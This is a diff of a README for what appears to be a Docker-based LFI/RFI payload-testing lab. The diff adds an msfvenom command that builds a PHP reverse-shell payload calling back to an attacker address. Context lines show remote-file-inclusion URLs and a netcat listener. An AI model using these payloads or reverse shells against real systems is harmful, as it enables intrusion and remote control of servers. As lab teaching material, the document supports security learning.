@@ -1,7 +1,7 @@
 # Installation
 
 - Install Docker (verified with version 2.0.0.3)
-- If you want to use the windows network on a non Windows OS also install [VirtualBox](https://www.virtualbox.org/) 
+- If you want to use the windows network on Aa non Windows OS also install [VirtualBox](https://www.virtualbox.org/) 
 
 ## Ubuntu
 
@@ -12,9 +12,9 @@ Notice that if not added to docker group, docker has to be run with sudo.
 
 Using [Cmder](https://cmder.net/) on Windows you can run `docker-compose -f lfi_linux_network.yml up --build` to run the linux network. 
 
-# Payloads
+# Examples
 
-For an in-detail-description of the following payloads go to [https://secf00tprint.github.io/blog/payload-tester/lfirfi/en](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en)
+Note, the reverse shell examples are verified with [Metasploit Version 5.0.37-dev](https://www.metasploit.com/) on [Kali Linux](https://www.kali.org/).
 
 ## RFI
 
@@ -37,6 +37,10 @@ Code running on the victim server:
 Code running on the attacker server:
 
 - [http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_attacker.php](http://127.0.0.1:8883/lfi.php?page=http://172.18.0.5/run_on_attacker.php)
+
+To get reverse shell you can use Metasploit:
+
+`msfvenom -a php --platform php -p php/reverse_perl lhost=172.18.0.5 lport=4444`
 
 ### LFI
 
@@ -94,8 +98,6 @@ nc 172.18.0.1 4444
 ## JSP
 
 ### RFI
-
-(You have to adjust ip addresses to the attacker server in the docker network)
 
 - [http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor](http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor)
 
